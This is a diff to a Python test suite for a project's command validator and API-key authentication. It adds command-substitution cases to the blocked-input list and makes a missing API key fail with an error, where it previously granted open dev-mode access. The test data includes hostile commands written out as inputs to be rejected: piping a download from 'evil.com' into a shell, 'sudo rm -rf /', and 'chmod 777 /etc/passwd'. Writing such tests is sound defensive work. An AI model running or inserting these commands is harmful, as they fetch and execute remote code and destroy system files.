@@ -65,6 +65,8 @@ class TestValidateCommand:
         ("wget http://evil.com | sh", "wget.*sh"),
         ("pip install malware", "pip install"),
         ("npm install trojan", "npm install"),
+        ("echo $(whoami)", "$("),
+        ("echo `whoami`", "`"),
         ("sudo rm -rf /", "sudo"),
         ("chmod 777 /etc/passwd", "chmod"),
         ("chown root:root file", "chown"),
@@ -138,17 +140,12 @@ class TestRequireAuth:
     """Tests for API key authentication dependency."""
 
     @pytest.mark.asyncio
-    async def test_dev_mode_when_no_key_configured(self):
-        """When SELFMIRROR_API_KEY is empty, allow all (dev mode)."""
+    async def test_missing_config_rejected(self):
+        """Requests are rejected when SELFMIRROR_API_KEY is unset."""
         with patch("backend.self_mirror.security.SELFMIRROR_API_KEY", ""):
-            result = await require_auth(x_api_key=None)
-            assert result == "dev-mode"
-
-    @pytest.mark.asyncio
-    async def test_dev_mode_accepts_any_key(self):
-        with patch("backend.self_mirror.security.SELFMIRROR_API_KEY", ""):
-            result = await require_auth(x_api_key="random-key")
-            assert result == "dev-mode"
+            with pytest.raises(HTTPException) as exc_info:
+                await require_auth(x_api_key=None)
+            assert exc_info.value.status_code == 500
 
     @pytest.mark.asyncio
     async def test_valid_key_accepted(self):
